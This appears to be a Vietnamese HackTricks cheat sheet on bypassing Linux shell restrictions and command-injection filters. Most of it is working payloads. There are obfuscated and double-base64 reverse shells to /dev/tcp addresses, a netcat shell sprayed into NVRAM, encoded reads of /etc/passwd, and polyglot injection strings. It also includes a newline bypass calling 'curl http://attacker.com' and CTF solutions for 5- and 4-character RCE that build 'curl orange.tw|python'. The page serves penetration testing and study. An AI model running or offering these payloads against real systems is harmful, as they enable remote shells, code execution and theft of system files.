# Vượt qua các hạn chế của Linux

{{#include ../../../banners/hacktricks-training.md}}

## Các cách vượt qua hạn chế phổ biến

Các bộ sưu tập về command-injection và WAF-evasion trong PayloadsAllTheThings, cheat sheet của Bo0oM và hai bài viết Secjuice được liên kết cung cấp thông tin nền tảng về các biến thể cú pháp shell trong phần này.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>

Để xác định shell sink và xác nhận việc thực thi mù, hãy xem [Command Injection](../../../pentesting-web/command-injection.md).

### Reverse Shell

```bash
# Double-Base64 payload
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

### Rev shell ngắn

```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```

### Bypass Paths và các từ bị cấm

```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```

### Bypass các khoảng trắng bị cấm

```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```

### Bypass backslash và slash

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### Bypass pipes

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### Bypass bằng mã hóa hex

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat "$abc"
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

### Tên lệnh không chứa chữ cái bằng cách trích dẫn octal

Cách trích dẫn ANSI-C `$'...'` của Bash giải mã các escape octal khi tạo một từ lệnh.<sup>[[7]](#references)</sup>

Vì vậy, danh sách chặn chữ cái có thể bị vô hiệu nếu vẫn cho phép `$`, dấu nháy đơn, dấu gạch chéo ngược, chữ số và dấu phân cách lệnh. Cách này không bypass dữ liệu đầu vào được truyền dưới dạng đối số dữ liệu có trích dẫn đúng cách.<sup>[[13]](#references)</sup>

Trong thử nghiệm cục bộ này, `:` đại diện cho lệnh đứng trước, còn `\151\144` được giải mã thành `id`.<sup>[[7]](#references)</sup> Có thể mã hóa các đối số thành những từ riêng biệt khi có dấu phân cách từ.<sup>[[13]](#references)</sup>

```bash
:;$'\151\144'
```

### Bypass IPs

```bash
# Decimal IPs
127.0.0.1 == 2130706433
```

### Exfiltration dữ liệu dựa trên thời gian

```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

### Lấy ký tự từ biến môi trường

```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```

### DNS data exfiltration

Đối với callback ngoài băng, một dịch vụ kiểu Collaborator như Burp Collaborator có thể khiến ứng dụng mục tiêu tương tác với máy chủ bên ngoài; liên kết [**pingb**](http://pingb.in) hiện có được giữ lại để tham khảo lịch sử, không phải để khẳng định dịch vụ hiện còn hoạt động.<sup>[[6]](#references)</sup>

### Builtins

Trong shell bị hạn chế, các builtin còn khả dụng là những lệnh duy nhất có thể dùng trong các ví dụ này; tài liệu Bash mô tả các lệnh builtin và cú pháp thực thi của chúng.<sup>[[7]](#references)</sup> Ý tưởng từ [**devploit**](https://twitter.com/devploit).\
Bắt đầu với liên kết tham khảo hiện có về [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), sau đó thử các kỹ thuật dành riêng cho Bash sau đây:<sup>[[7]](#references)</sup>

```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```

### Polyglot command injection

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

### Các regex tiềm năng để bypass

```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```

### Bashfuscator

Lệnh gọi sau sử dụng Bashfuscator, một framework mã nguồn mở để làm rối mã Bash; liên kết đến repository trong chú thích mã được giữ lại để tiện điều hướng.<sup>[[8]](#references)</sup>

```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```

### RCE với 5 ký tự

Hai ví dụ lịch sử dài 5 ký tự sau được giữ lại dưới dạng tái hiện thử thách: kho lưu trữ thử thách chính có tại [kho lưu trữ của Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), trong khi liên kết write-up thứ hai trong khối mã là liên kết điều hướng mà tính khả dụng hiện tại chưa được xác minh.<sup>[[9]](#references)</sup>

```bash
# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Orange Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```

### RCE với 4 ký tự

```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```

## Bypass Read-Only/Noexec/Distroless

Nếu bạn đang ở trong một filesystem có **các biện pháp bảo vệ read-only và noexec**, hoặc trong một **image Distroless**, môi trường sẽ áp đặt các hạn chế thực thi được tài liệu `mount(8)` của Linux và dự án Distroless ghi lại; trang được liên kết tổng hợp các kỹ thuật để xử lý những hạn chế này.<sup>[[11]](#references)[[12]](#references)</sup>

{{#ref}}
bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

## Bypass Chroot & các Jail khác

{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

## NOP Sled Dựa trên Khoảng trắng của Bash ("Bashsledding")

Khi một lỗ hổng cho phép bạn kiểm soát một phần một đối số mà cuối cùng được truyền đến `system()` hoặc một shell khác, vị trí của payload có thể không xác định. Alan Cao và Will Tan mô tả một trường hợp trên thiết bị nhúng bị giới hạn, trong đó payload shell được rải vào vùng NVRAM được ánh xạ bộ nhớ và thêm các dấu cách ở phía trước.<sup>[[5]](#references)</sup>

Do đó, bạn có thể tạo một *NOP sled cho Bash* bằng cách thêm một chuỗi dài dấu cách hoặc ký tự tab trước lệnh thực sự; Bash định nghĩa dấu cách và tab là các ký tự trắng dùng để phân tách từ trong một lệnh đơn giản.<sup>[[5]](#references)[[7]](#references)</sup>

```bash
# Payload sprayed into an environment variable / NVRAM entry
"                nc -e /bin/sh 10.0.0.1 4444"
# 16× spaces ───┘ ↑ real command
```

Nếu một ROP chain (hoặc primitive làm hỏng bộ nhớ khác) truyền vào một con trỏ đến chuỗi lệnh bắt đầu ở bất kỳ vị trí nào trong khối khoảng trắng, Bash có thể phân tích các khoảng trắng đứng đầu còn lại cho đến khi gặp lệnh; trong router exploit được trích dẫn, điều này giúp sử dụng được các độ lệch chuỗi không chắc chắn.<sup>[[5]](#references)[[7]](#references)</sup>

Các trường hợp sử dụng thực tế trên những thiết bị nhúng bị hạn chế bao gồm:<sup>[[5]](#references)</sup>

1. **Các blob cấu hình được ánh xạ bộ nhớ** (ví dụ: NVRAM) có thể truy cập giữa các tiến trình.<sup>[[5]](#references)</sup>
2. Các kênh payload mà attacker không thể ghi byte NULL để căn chỉnh payload (một cách áp dụng tổng quát cho vấn đề căn chỉnh).<sup>[[5]](#references)</sup>
3. Các thiết bị nhúng có môi trường BusyBox `ash`/`sh` nhỏ gọn; BusyBox mô tả chúng là các applet dành cho hệ thống bị giới hạn tài nguyên.<sup>[[10]](#references)</sup>

> 🛠️  Kết hợp kỹ thuật này với các ROP gadget gọi `system()` trong môi trường lab được kiểm soát; nghiên cứu về router được trích dẫn minh họa sự kết hợp này trên phần cứng bị giới hạn.<sup>[[5]](#references)</sup>



## References

- [1] [PayloadsAllTheThings - Chèn lệnh](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
- [2] [Bo0oM - Tài liệu tham khảo về cách vượt qua WAF](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
- [3] [Kỹ thuật né tránh Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
- [4] [Kỹ thuật né tránh Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
- [5] [Alan Cao và Will Tan — Khai thác zero-day trên phần cứng bị bỏ hoang – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- [7] [bash(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [9] [Thử thách CTF web của tôi — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
- [11] [mount(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
- [13] [Dojo CTF #36: Bài giải Shell Escape — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
{{#include ../../../banners/hacktricks-training.md}}
